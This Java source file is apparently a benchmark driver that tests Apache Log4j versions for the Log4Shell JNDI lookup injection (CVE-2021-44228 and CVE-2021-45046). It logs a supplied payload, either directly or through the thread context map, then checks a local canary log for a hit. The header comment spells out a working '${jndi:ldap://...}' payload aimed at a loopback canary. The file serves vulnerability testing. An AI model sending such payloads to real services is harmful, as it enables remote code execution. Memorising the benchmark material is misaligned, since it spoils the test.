// PatchClosure-Bench faithful-core driver for apache-log4j-2-cve-2021-45046
// (CVE-2021-44228 [Log4Shell] -> CVE-2021-45046, Apache Log4j 2 JNDI Lookup Injection, CWE-917).
//
// Uses the REAL, unmodified published Apache log4j-core/log4j-api (from Maven Central) via the
// ordinary public logging API. It does NOTHING special to trigger JNDI -- it just logs an
// attacker-controlled string and/or puts an attacker-controlled value into the Thread Context
// Map (MDC), exactly like a web app logging a request header. Whether the ${jndi:...} inside
// that data is interpolated and fires a lookup is decided entirely by the version's own
// unmodified log4j guard code (MessagePatternConverter lookups default, JndiManager host/proto
// allow-list, StrSubstitutor recursion). No log4j class is modified.
//
// Protocol: stdin gives "key=value" lines:
//   vector=message | ctx      (message = plain logged string; ctx = value carried in MDC)
//   token=<per-probe token>   (also embedded in the payload's LDAP DN)
//   payload=${jndi:ldap://127.0.0.1:1389/<token>}
//   mdc_key=pcbctx            (only for vector=ctx; must match log4j2.xml $${ctx:...})
// After logging we poll /canary/hits.log for our token; if the benign OOB canary recorded a
// hit it also recorded the planted ${PCB_FLAG}, which we echo -- proof the JNDI lookup fired.
import java.io.*;
import java.nio.file.*;
import java.util.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

public class Driver {
    static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "'").replace("\n", " ").replace("\r", " ");
    }

    public static void main(String[] args) throws Exception {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in, "UTF-8"));
        Map<String, String> p = new LinkedHashMap<>();
        String line;
        while ((line = br.readLine()) != null) {
            int i = line.indexOf('=');
            if (i >= 0) p.put(line.substring(0, i).trim(), line.substring(i + 1));
        }
        String vector = p.getOrDefault("vector", "message");
        String token = p.getOrDefault("token", "");
        String payload = p.getOrDefault("payload", "");
        String mdcKey = p.getOrDefault("mdc_key", "pcbctx");

        Logger log = LogManager.getLogger("pcb");
        if ("ctx".equals(vector)) {
            // Attacker controls MDC data; the log4j2.xml PatternLayout renders it via $${ctx:pcbctx}.
            ThreadContext.put(mdcKey, payload);
            log.info("user request received");
            ThreadContext.clearAll();
        } else {
            // Plain message vector (the CVE-2021-44228 seed): log the attacker string directly.
            log.info(payload);
        }

        // Poll the benign OOB canary's hit log for our token (the JNDI connection is async).
        String flagEcho = "";
        Path hits = Paths.get("/canary/hits.log");
        for (int t = 0; t < 40 && flagEcho.isEmpty(); t++) {
            if (Files.exists(hits)) {
                for (String h : Files.readAllLines(hits)) {
                    int tab = h.indexOf('\t');
                    if (tab > 0 && h.substring(0, tab).contains(token)) {
                        flagEcho = h.substring(tab + 1);
                        break;
                    }
                }
            }
            if (flagEcho.isEmpty()) Thread.sleep(75);
        }

        System.out.flush();
        System.out.println("{\"vector\":\"" + esc(vector) + "\""
                + ",\"fired\":" + (!flagEcho.isEmpty())
                + ",\"flag_echo\":\"" + esc(flagEcho) + "\"}");
    }
}
